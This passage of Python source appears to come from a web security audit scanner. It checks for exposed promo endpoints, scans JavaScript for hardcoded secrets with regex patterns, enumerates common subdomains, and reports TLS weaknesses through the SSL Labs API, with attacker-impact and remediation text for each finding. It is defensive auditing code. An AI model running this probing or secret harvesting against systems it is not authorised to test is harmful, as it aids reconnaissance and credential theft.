                                  ["code", "promo", "bonus", "amount", "credit", "token", "expire", "valid", "coupon", "voucher"])
                findings.append({
                    "id": f"promo_{path.strip('/').replace('/', '_')}",
                    "name": f"Exposed {label}: {path}",
                    "category": "Business Logic / Promo Exposure",
                    "severity": "high" if interesting else "medium",
                    "status": "vulnerable",
                    "matched_at": base + path,
                    "attacker_can": (
                        f"Access {path} which returned HTTP {status}. "
                        f"{'Response contains promo/bonus data — an attacker can enumerate promo codes, harvest active bonuses, or replay redemption requests to claim credits at scale.' if interesting else 'This endpoint may expose promo logic, codes, or redemption workflows that can be reverse-engineered and abused.'}"
                    ),
                    "attacker_cannot": None,
                    "recommendation": f"Require authentication on {path}. Implement rate limiting. Validate redemption server-side (one-time use, per-account limits, expiry checks). Do not expose promo codes or amounts in unauthenticated responses.",
                    "detail": f"HTTP {status} from {path}" + (f" | Response snippet: {body_preview[:120]}" if interesting else ""),
                    "burp": BURP_PROMO,
                })
        except Exception:
            pass
    return findings


def _check_js_secrets(url: str) -> list:
    """Fetch the homepage, extract JS files, scan for hardcoded secrets."""
    import re as _re
    findings = []

    SECRET_PATTERNS = [
        (_re.compile(r'(?i)(api[_-]?key|apikey)\s*[:=]\s*["\']([A-Za-z0-9_\-]{16,64})["\']'), "API Key"),
        (_re.compile(r'(?i)(secret[_-]?key|client[_-]?secret)\s*[:=]\s*["\']([A-Za-z0-9_\-]{16,64})["\']'), "Secret Key"),
        (_re.compile(r'(?i)(access[_-]?token|auth[_-]?token)\s*[:=]\s*["\']([A-Za-z0-9_\-\.]{16,128})["\']'), "Access Token"),
        (_re.compile(r'(?i)(password|passwd|pwd)\s*[:=]\s*["\']([^\'"]{6,64})["\']'), "Hardcoded Password"),
        (_re.compile(r'(?i)(aws_access_key_id|aws_secret)\s*[:=]\s*["\']([A-Za-z0-9/+=]{16,64})["\']'), "AWS Credential"),
        (_re.compile(r'(?i)Bearer\s+([A-Za-z0-9_\-\.]{20,})', ), "Bearer Token"),
        (_re.compile(r'(?i)(stripe[_-]?(?:live|secret)[_-]?key)\s*[:=]\s*["\']([A-Za-z0-9_]{20,})["\']'), "Stripe Key"),
        (_re.compile(r'(?i)(firebase[_-]?(?:api[_-]?key|token))\s*[:=]\s*["\']([A-Za-z0-9_\-]{20,})["\']'), "Firebase Key"),
    ]

    try:
        # Fetch homepage
        req = urllib.request.Request(url, headers={"User-Agent": "CyberScan/1.0 Security Audit"})
        with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
            html = resp.read(200000).decode("utf-8", errors="ignore")

        # Extract JS file URLs
        import re as _re2
        js_urls = _re2.findall(r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']', html, _re2.IGNORECASE)
        from urllib.parse import urljoin, urlparse
        parsed_base = urlparse(url)
        base_domain = f"{parsed_base.scheme}://{parsed_base.netloc}"

        js_full_urls = []
        for js in js_urls[:15]:  # cap at 15 JS files
            full = urljoin(base_domain, js)
            if urlparse(full).netloc == parsed_base.netloc:
                js_full_urls.append(full)

        # Scan each JS file
        secrets_found = []
        for js_url in js_full_urls:
            try:
                req2 = urllib.request.Request(js_url, headers={"User-Agent": "CyberScan/1.0 Security Audit"})
                with urllib.request.urlopen(req2, timeout=8) as r:
                    js_content = r.read(500000).decode("utf-8", errors="ignore")

                for pattern, label in SECRET_PATTERNS:
                    for m in pattern.finditer(js_content):
                        groups = m.groups()
                        value = groups[-1] if groups else m.group(0)
                        # Skip obvious placeholders
                        if value.lower() in ("your_api_key", "xxxx", "example", "placeholder", "your_token", "secret"):
                            continue
                        secrets_found.append({
                            "label": label,
                            "value": value[:8] + "..." + value[-4:] if len(value) > 16 else value,
                            "file": js_url.split("/")[-1],
                        })
            except Exception:
                pass

        if secrets_found:
            # Deduplicate by label+file
            seen = set()
            unique = []
            for s in secrets_found:
                key = (s["label"], s["file"])
                if key not in seen:
                    seen.add(key)
                    unique.append(s)

            detail_lines = [f"{s['label']} in {s['file']}: {s['value']}" for s in unique[:6]]
            findings.append({
                "id": "js_secrets",
                "name": f"Hardcoded Secrets in JavaScript ({len(unique)} found)",
                "category": "Information Disclosure / Secret Leakage",
                "severity": "critical",
                "status": "vulnerable",
                "matched_at": url,
                "attacker_can": (
                    f"Read {len(unique)} hardcoded secret(s) directly from your JavaScript source files — "
                    "no authentication required, no hacking needed. These credentials can be used to access your APIs, "
                    "payment gateways, databases, or cloud infrastructure as if the attacker were your own application."
                ),
                "attacker_cannot": None,
                "recommendation": "Remove all secrets from client-side JavaScript immediately. Move API calls server-side. Use environment variables on the backend. Rotate any exposed credentials immediately.",
                "detail": " | ".join(detail_lines),
                "burp": BURP_JS_SECRET,
            })
        else:
            findings.append({
                "id": "js_secrets",
                "name": "JavaScript Secret Scan",
                "category": "Information Disclosure / Secret Leakage",
                "severity": "info",
                "status": "protected",
                "matched_at": url,
                "attacker_can": None,
                "attacker_cannot": f"Find hardcoded API keys, tokens or passwords in JavaScript files — {len(js_full_urls)} JS file(s) scanned, no secrets detected.",
                "recommendation": None,
                "detail": f"Scanned {len(js_full_urls)} JS file(s): no hardcoded secrets found.",
                "burp": None,
            })
    except Exception as e:
        findings.append({
            "id": "js_secrets",
            "name": "JavaScript Secret Scan",
            "category": "Information Disclosure / Secret Leakage",
            "severity": "info",
            "status": "protected",
            "matched_at": url,
            "attacker_can": None,
            "attacker_cannot": None,
            "recommendation": None,
            "detail": f"JS secret scan skipped: {e}",
            "burp": None,
        })
    return findings


def _check_subdomains(url: str) -> list:
    """Probe common subdomains for exposed services."""
    from urllib.parse import urlparse
    parsed = urlparse(url)
    hostname = parsed.hostname or ""
    scheme = parsed.scheme

    # Strip www. to get root domain
    root = hostname
    if root.startswith("www."):
        root = root[4:]

    SUBDOMAINS = [
        "api", "admin", "staging", "stage", "dev", "development",
        "test", "beta", "portal", "dashboard", "manage", "management",
        "secure", "pay", "payments", "checkout", "shop",
        "internal", "backend", "services", "mobile", "m",
        "old", "legacy", "v1", "v2",
    ]

    findings = []
    for sub in SUBDOMAINS:
        fqdn = f"{sub}.{root}"
        if fqdn == hostname:
            continue
        target = f"{scheme}://{fqdn}"
        try:
            # DNS check first (fast fail)
            socket.getaddrinfo(fqdn, None, socket.AF_INET)
            # If DNS resolves, try HTTP
            req = urllib.request.Request(target, headers={"User-Agent": "CyberScan/1.0 Security Audit"})
            try:
                with urllib.request.urlopen(req, timeout=5) as resp:
                    status = resp.status
                    server = dict(resp.headers).get("Server", "")
            except urllib.error.HTTPError as e:
                status = e.code
                server = ""

            if status < 500:
                is_sensitive = sub in ("admin", "internal", "backend", "manage", "management", "staging", "dev", "development", "test")
                findings.append({
                    "id": f"subdomain_{sub}",
                    "name": f"Live Subdomain: {fqdn}",
                    "category": "Subdomain / Attack Surface",
                    "severity": "high" if is_sensitive else "medium",
                    "status": "vulnerable",
                    "matched_at": target,
                    "attacker_can": (
                        f"Access {target} (HTTP {status}) — {'this is a sensitive subdomain (' + sub + ') that likely has relaxed security, debug endpoints, or admin interfaces without WAF protection.' if is_sensitive else 'this subdomain expands the attack surface and may run older software versions or have different security policies than the main site.'}"
                    ),
                    "attacker_cannot": None,
                    "recommendation": f"{'Restrict access to ' + fqdn + ' by IP allowlist or VPN — it should never be publicly accessible.' if is_sensitive else 'Ensure ' + fqdn + ' has the same security headers, TLS config and WAF rules as the main domain.'}",
                    "detail": f"DNS resolves + HTTP {status} from {fqdn}" + (f" (Server: {server})" if server else ""),
                    "burp": BURP_SUBDOMAIN,
                })
        except (socket.gaierror, socket.herror, OSError):
            pass  # DNS not found — not a finding
        except Exception:
            pass
    return findings


def run_http_checks(url: str) -> tuple:
    """
    Returns (findings_list, cloudflare_info_dict).
    cloudflare_info is always present — detected=False if not behind Cloudflare.
    """
    from urllib.parse import urlparse
    results = []
    results.append(_check_ssl(url))
    hostname = urlparse(url).hostname or ""

    try:
        headers, status, final_url = _fetch(url)
    except Exception as e:
        cf_info = _detect_cloudflare({}, hostname)
        results.append({
            "id": "fetch_error",
            "name": "Site Reachability",
            "category": "Connectivity",
            "severity": "critical",
            "status": "vulnerable",
            "matched_at": url,
            "attacker_can": None,
            "attacker_cannot": None,
            "recommendation": "Verify the URL is correct and the server is running.",
            "detail": f"Could not connect: {e}",
        })
        return results, cf_info

    cf_info = _detect_cloudflare(headers, hostname)

    for chk in CHECKS:
        burp = BURP_INFO.get(chk["id"])
        if chk["header"] is None:
            server = headers.get("server", "")
            xpb = headers.get("x-powered-by", "")
            if server or xpb:
                detail_parts = []
                if server: detail_parts.append(f"Server: {server}")
                if xpb: detail_parts.append(f"X-Powered-By: {xpb}")
                results.append({
                    "id": chk["id"], "name": chk["name"], "category": chk["category"],
                    "severity": chk["severity_fail"], "status": "vulnerable",
                    "matched_at": url,
                    "attacker_can": chk["attacker_can"], "attacker_cannot": None,
                    "recommendation": chk["recommendation"],
                    "detail": " | ".join(detail_parts), "burp": burp,
                })
            else:
                results.append({
                    "id": chk["id"], "name": chk["name"], "category": chk["category"],
                    "severity": "info", "status": "protected",
                    "matched_at": url,
                    "attacker_can": None, "attacker_cannot": chk["attacker_cannot"],
                    "recommendation": None,
                    "detail": "No server version headers detected.", "burp": burp,
                })
        else:
            present = chk["header"] in headers
            results.append({
                "id": chk["id"], "name": chk["name"], "category": chk["category"],
                "severity": chk["severity_fail"] if not present else "info",
                "status": "protected" if present else "vulnerable",
                "matched_at": url,
                "attacker_can": None if present else chk["attacker_can"],
                "attacker_cannot": chk["attacker_cannot"] if present else None,
                "recommendation": None if present else chk["recommendation"],
                "detail": headers.get(chk["header"], "Header not present"), "burp": burp,
            })

    results.extend(_check_exposed_panels(url))

    # ── CORS misconfiguration ───────────────────────────────────────────────
    results.append(_check_cors(url))

    # ── Cookie security flags ───────────────────────────────────────────────
    results.extend(_check_cookie_security(headers, url))

    # ── Rate limiting detection ─────────────────────────────────────────────
    results.append(_check_rate_limiting(url))

    # ── Promo / bonus endpoint discovery ───────────────────────────────────
    results.extend(_check_promo_endpoints(url))

    # ── JavaScript secret scanning ──────────────────────────────────────────
    results.extend(_check_js_secrets(url))

    # ── Subdomain enumeration ───────────────────────────────────────────────
    results.extend(_check_subdomains(url))

    return results, cf_info


# ---------------------------------------------------------------------------
# SSL Labs deep TLS analysis
# ---------------------------------------------------------------------------

SSL_LABS_API = "https://api.ssllabs.com/api/v3"

def _ssl_labs_get(params: dict) -> dict:
    qs = "&".join(f"{k}={v}" for k, v in params.items())
    req = urllib.request.Request(
        f"{SSL_LABS_API}/analyze?{qs}",
        headers={"User-Agent": "CyberScan/1.0 Security Audit"},
    )
    with urllib.request.urlopen(req, timeout=20) as r:
        return json.loads(r.read())


def run_ssl_labs_checks(url: str) -> list:
    """
    Query the free SSL Labs API for deep TLS analysis.
    Returns findings in the same format as run_http_checks().
    Works even on Cloudflare-protected sites because it operates at TLS level.
    """
    from urllib.parse import urlparse
    parsed = urlparse(url)
    hostname = parsed.hostname
    if not hostname or parsed.scheme != "https":
        return []

    findings = []
    try:
        # Kick off scan (fromCache=on reuses recent results so we don't wait)
        data = _ssl_labs_get({"host": hostname, "fromCache": "on", "all": "done"})

        # If cache miss, start fresh and poll
        if data.get("status") == "DNS":
            data = _ssl_labs_get({"host": hostname, "startNew": "on", "all": "done"})

        attempts = 0
        while data.get("status") not in ("READY", "ERROR") and attempts < 25:
            time.sleep(8)
            data = _ssl_labs_get({"host": hostname, "all": "done"})
            attempts += 1

        if data.get("status") != "READY":
            return []

        endpoints = data.get("endpoints", [])
        if not endpoints:
            return []

        # Use the best-graded endpoint
        endpoints_sorted = sorted(endpoints, key=lambda e: e.get("grade", "Z"))
        ep = endpoints_sorted[0]
        grade = ep.get("grade", "?")
        details = ep.get("details", {})

        # ── Grade summary finding ──────────────────────────────────────────
        grade_is_bad = grade not in ("A", "A+")
        grade_attacker_can = (
            f"Exploit TLS weaknesses on this server — SSL Labs grades it '{grade}' meaning it supports "
            "deprecated protocols or weak ciphers that enable downgrade and decryption attacks."
        ) if grade_is_bad else None
        grade_attacker_cannot = (
            "Exploit TLS weaknesses — SSL Labs grades this server A or A+, meaning modern-only "
            "protocols and strong ciphers are enforced."
        ) if not grade_is_bad else None
        findings.append({
            "id": "ssl_labs_grade",
            "name": f"SSL Labs Grade: {grade}",
            "category": "TLS Deep Analysis (SSL Labs)",
            "severity": "high" if grade_is_bad else "info",
            "status": "vulnerable" if grade_is_bad else "protected",
            "matched_at": hostname,
            "attacker_can": grade_attacker_can,
            "attacker_cannot": grade_attacker_cannot,
            "recommendation": "Target an A+ grade: enable TLS 1.3 only, disable TLS 1.0/1.1, deploy HSTS, use AEAD ciphers." if grade_is_bad else None,
            "detail": f"SSL Labs assessed {hostname} and assigned grade {grade}.",
            "burp": None,
        })

        # ── TLS 1.0 / 1.1 still supported ─────────────────────────────────
        protocols = details.get("protocols", [])
        weak_proto_names = [
            f"TLS {p['version']}" for p in protocols
            if str(p.get("version", "")) in ("1.0", "1.1")
        ]
        if weak_proto_names:
            proto_str = " and ".join(weak_proto_names)
            findings.append({
                "id": "ssl_labs_tls_old",
                "name": f"Deprecated TLS Protocol: {proto_str} Enabled",
                "category": "TLS Deep Analysis (SSL Labs)",
                "severity": "high",
                "status": "vulnerable",
                "matched_at": hostname,
                "attacker_can": (
                    f"Force your server into {proto_str} — a deprecated protocol full of known "
                    "vulnerabilities. On TLS 1.0 + CBC ciphers the attacker can execute the BEAST attack "
                    "to decrypt your users' session cookies byte-by-byte. This also caps your SSL Labs "
                    f"grade to B and may fail PCI DSS compliance audits."
                ),
                "attacker_cannot": None,
                "recommendation": f"Disable {proto_str} in your TLS configuration. Only TLS 1.2 (with AEAD ciphers) and TLS 1.3 should be enabled.",
                "detail": f"Server supports: {', '.join(weak_proto_names)}. These should be disabled.",
                "burp": BURP_TLS_OLD,
            })
        else:
            enabled = [f"TLS {p['version']}" for p in protocols]
            findings.append({
                "id": "ssl_labs_tls_old",
                "name": "Modern TLS Protocols Only",
                "category": "TLS Deep Analysis (SSL Labs)",
                "severity": "info",
                "status": "protected",
                "matched_at": hostname,
                "attacker_can": None,
                "attacker_cannot": "Force a downgrade to deprecated TLS 1.0 or 1.1 — only modern TLS versions are accepted.",
                "recommendation": None,
                "detail": f"Enabled: {', '.join(enabled)}. No deprecated protocols.",
                "burp": None,
            })

        # ── Weak cipher suites ─────────────────────────────────────────────
        suites_data = details.get("suites", [])
        weak_ciphers = []
        for suite_group in suites_data:
            for cs in suite_group.get("list", []):
                if cs.get("q") == 0:  # q=0 means WEAK in SSL Labs API
                    weak_ciphers.append(cs.get("name", "Unknown"))
        if weak_ciphers:
            sample = weak_ciphers[:3]
            findings.append({
                "id": "ssl_labs_weak_ciphers",
                "name": f"Weak Cipher Suites Enabled ({len(weak_ciphers)} found)",
                "category": "TLS Deep Analysis (SSL Labs)",
                "severity": "medium",
                "status": "vulnerable",
                "matched_at": hostname,
                "attacker_can": (
                    f"Negotiate a weak cipher suite (e.g. {sample[0]}) during the TLS handshake. "
                    "CBC-mode ciphers are vulnerable to Lucky13 and BEAST padding oracle attacks — "
                    "the attacker captures encrypted traffic and, through thousands of crafted requests, "
                    "recovers plaintext session tokens without the private key."
                ),
                "attacker_cannot": None,
                "recommendation": "Disable all CBC and 3DES cipher suites. Configure your server to use only AEAD ciphers: AES-GCM and ChaCha20-Poly1305.",
                "detail": f"Weak ciphers: {', '.join(weak_ciphers[:5])}{'...' if len(weak_ciphers) > 5 else ''}",
                "burp": BURP_WEAK_CIPHER,
            })
        else:
            findings.append({
                "id": "ssl_labs_weak_ciphers",
                "name": "No Weak Cipher Suites",
                "category": "TLS Deep Analysis (SSL Labs)",
                "severity": "info",
                "status": "protected",
                "matched_at": hostname,
                "attacker_can": None,
                "attacker_cannot": "Negotiate a weak cipher — only strong AEAD cipher suites are offered.",
                "recommendation": None,
                "detail": "All cipher suites use strong AEAD encryption (AES-GCM / ChaCha20).",
                "burp": None,
            })

        # ── BEAST ─────────────────────────────────────────────────────────
        if details.get("vulnBeast"):
            findings.append({
                "id": "ssl_labs_beast",
                "name": "BEAST Attack — Not Mitigated",
                "category": "TLS Deep Analysis (SSL Labs)",
                "severity": "medium",
                "status": "vulnerable",
                "matched_at": hostname,
                "attacker_can": (
                    "Execute the BEAST (Browser Exploit Against SSL/TLS) attack against users on TLS 1.0. "
                    "By injecting JavaScript into any resource the victim's browser loads, the attacker "
                    "controls part of the plaintext and can decrypt session cookies byte-by-byte — "
                    "gaining full account access without knowing the password."
                ),
                "attacker_cannot": None,
                "recommendation": "Disable TLS 1.0 entirely and prioritise TLS 1.3. If TLS 1.2 must be kept, use only GCM (AEAD) cipher suites — they are immune to BEAST.",
                "detail": "Server supports TLS 1.0 + CBC ciphers. BEAST is unmitigated server-side.",
                "burp": BURP_BEAST,
            })

        # ── POODLE ────────────────────────────────────────────────────────
        if details.get("poodle") or details.get("poodleTls") == 2:
            findings.append({
                "id": "ssl_labs_poodle",
                "name": "POODLE Attack Vulnerable",
                "category": "TLS Deep Analysis (SSL Labs)",
                "severity": "high",
                "status": "vulnerable",
                "matched_at": hostname,
                "attacker_can": (
                    "Exploit the POODLE (Padding Oracle On Downgraded Legacy Encryption) vulnerability "
                    "to decrypt HTTPS sessions. The attacker forces a downgrade to SSLv3, then uses "
                    "your browser as a padding oracle — making ~256 crafted requests per byte of your "
                    "session cookie. A typical session cookie is cracked in under 5 minutes."
                ),
                "attacker_cannot": None,
                "recommendation": "Disable SSLv3 completely on your server. It has no safe use — TLS 1.2+ replaces it entirely.",
                "detail": "Server is vulnerable to POODLE — SSLv3 padding oracle attack confirmed.",
                "burp": BURP_POODLE,
            })

        # ── Heartbleed ────────────────────────────────────────────────────
        if details.get("heartbleed"):
            findings.append({
                "id": "ssl_labs_heartbleed",
                "name": "Heartbleed Vulnerability (CVE-2014-0160)",
                "category": "TLS Deep Analysis (SSL Labs)",
                "severity": "critical",
                "status": "vulnerable",
                "matched_at": hostname,
                "attacker_can": (
                    "Read up to 64KB of your server's live RAM per request — completely unauthenticated. "
                    "This memory contains TLS private keys, session tokens, plaintext passwords from "
                    "active user sessions, database credentials, and API keys. The attacker can "
                    "impersonate your server, decrypt past and future traffic, and steal any user's "
                    "session. It leaves no trace in your access logs."
                ),
                "attacker_cannot": None,
                "recommendation": "Update OpenSSL immediately to 1.0.1g or later. Revoke and reissue all TLS certificates. Invalidate all session tokens. This is a critical emergency fix.",
                "detail": "Heartbleed (CVE-2014-0160) confirmed — OpenSSL memory leak via malformed heartbeat request.",
                "burp": BURP_HEARTBLEED,
            })

        # ── DROWN ─────────────────────────────────────────────────────────
        if details.get("drownVulnerable"):
            findings.append({
                "id": "ssl_labs_drown",
                "name": "DROWN Attack Vulnerable",
                "category": "TLS Deep Analysis (SSL Labs)",
                "severity": "high",
                "status": "vulnerable",
                "matched_at": hostname,
                "attacker_can": (
                    "Decrypt your modern TLS traffic by attacking SSLv2 on the same server (or another "
                    "server sharing the same private key). DROWN requires no access to the client — "
                    "the attacker captures TLS ciphertext, uses SSLv2 export cipher handshakes as a "
                    "decryption oracle, and recovers the session key in hours. Full HTTPS session "
                    "contents are then readable: credentials, tokens, payment data."
                ),
                "attacker_cannot": None,
                "recommendation": "Disable SSLv2 on all servers sharing this private key. Do not reuse private keys across servers. Patch OpenSSL to remove SSLv2 support.",
                "detail": "Server is vulnerable to DROWN — SSLv2 enabled, enabling cross-protocol decryption of TLS traffic.",
                "burp": BURP_DROWN,
            })

        # ── Logjam ────────────────────────────────────────────────────────
        if details.get("logjam"):
            findings.append({
                "id": "ssl_labs_logjam",
                "name": "Logjam — Weak Diffie-Hellman Key Exchange",
                "category": "TLS Deep Analysis (SSL Labs)",
                "severity": "high",
                "status": "vulnerable",
                "matched_at": hostname,
                "attacker_can": (
                    "Downgrade your TLS handshake to use 512-bit export-grade Diffie-Hellman. "
                    "Using precomputed discrete log tables (feasible on standard hardware for 512-bit DH), "
                    "the attacker recovers the session key in real time and reads the full HTTPS session — "
                    "silently, with no indication to the user or server."
                ),
                "attacker_cannot": None,
                "recommendation": "Disable DHE_EXPORT cipher suites. Generate a unique 2048-bit or 4096-bit DH group. Prefer ECDHE key exchange (X25519 or P-256).",
                "detail": "Server supports export-grade Diffie-Hellman — susceptible to Logjam downgrade.",
                "burp": BURP_LOGJAM,
            })

        # ── FREAK ─────────────────────────────────────────────────────────
        if details.get("freak"):
            findings.append({
                "id": "ssl_labs_freak",
                "name": "FREAK — Export RSA Keys Supported",
                "category": "TLS Deep Analysis (SSL Labs)",
                "severity": "high",
                "status": "vulnerable",
                "matched_at": hostname,
                "attacker_can": (
                    "Force your server into 512-bit RSA_EXPORT key exchange by stripping all "
                    "strong cipher suites from the ClientHello. A 512-bit RSA key can be factored "
                    "in ~7 hours on Amazon EC2 (~$100). Once factored, the attacker decrypts "
                    "all captured HTTPS traffic — exposing every user's session tokens and credentials."
                ),
                "attacker_cannot": None,
                "recommendation": "Disable all RSA_EXPORT cipher suites on your server. Enable only ECDHE and DHE key exchange with 2048-bit+ parameters.",
                "detail": "Server accepts RSA_EXPORT cipher suites — FREAK downgrade attack possible.",
                "burp": BURP_FREAK,
            })

        # ── HSTS (from SSL Labs — works even through Cloudflare) ──────────
        hsts_policy = details.get("hstsPolicy", {})
        hsts_status = hsts_policy.get("status", "absent")
        if hsts_status == "absent":
            findings.append({
                "id": "ssl_labs_hsts",
                "name": "HSTS Not Configured (Confirmed via TLS Layer)",
                "category": "TLS Deep Analysis (SSL Labs)",
                "severity": "high",
                "status": "vulnerable",
                "matched_at": hostname,
                "attacker_can": (
                    "Perform an SSL strip / downgrade attack on first-time visitors. Without HSTS, "
                    "the browser has no memory of HTTPS being required — so an attacker on the same "
                    "network intercepts the initial HTTP request, strips the redirect to HTTPS, and "
                    "reads the session in plain text through Burp Proxy. Credentials entered on "
                    "the first visit are fully exposed."
                ),
                "attacker_cannot": None,
                "recommendation": "Add Strict-Transport-Security: max-age=31536000; includeSubDomains; preload. Submit to the HSTS preload list at hstspreload.org.",
                "detail": "No HSTS policy detected at TLS level — confirmed by SSL Labs deep scan.",
                "burp": BURP_NO_HSTS_SSL,
            })
        else:
            max_age = hsts_policy.get("maxAge", 0)
            findings.append({
                "id": "ssl_labs_hsts",
                "name": "HSTS Policy Active (TLS Verified)",
                "category": "TLS Deep Analysis (SSL Labs)",
                "severity": "info",
                "status": "protected",
                "matched_at": hostname,
                "attacker_can": None,
                "attacker_cannot": "Strip HTTPS and force users onto plain HTTP — the browser remembers HSTS and refuses the downgrade.",
                "recommendation": None,
                "detail": f"HSTS confirmed by SSL Labs. max-age={max_age}s.",
                "burp": None,
            })

    except Exception:
        # SSL Labs unavailable or rate-limited — no findings, not an error
        pass

    return findings
